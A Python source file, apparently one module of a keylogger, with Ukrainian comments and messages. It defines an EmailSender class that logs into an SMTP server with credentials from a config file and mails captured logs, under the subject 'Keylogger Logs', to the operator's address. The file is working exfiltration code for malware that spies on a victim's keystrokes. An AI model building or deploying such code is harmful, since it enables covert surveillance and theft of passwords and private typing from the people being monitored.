import smtplib
from email.mime.text import MIMEText
from config import config

class EmailSender:
    def __init__(self):
        self.email_settings = config.get('email_settings', {})

    def send_email(self, log_content):
        """Відправляє логи на email."""
        if not config.get('send_email', False):
            return

        msg = MIMEText(log_content)
        msg['Subject'] = 'Keylogger Logs'
        msg['From'] = self.email_settings.get('email_from')
        msg['To'] = self.email_settings.get('email_to')

        try:
            server = smtplib.SMTP(self.email_settings.get('smtp_server'), self.email_settings.get('smtp_port'))
            server.starttls()
            server.login(self.email_settings.get('email_from'), self.email_settings.get('email_password'))
            server.sendmail(self.email_settings.get('email_from'), [self.email_settings.get('email_to')], msg.as_string())
            server.quit()
            print(f"Логи надіслано на {self.email_settings.get('email_to')}")
        except Exception as e:
            print(f"Не вдалося надіслати email: {str(e)}")
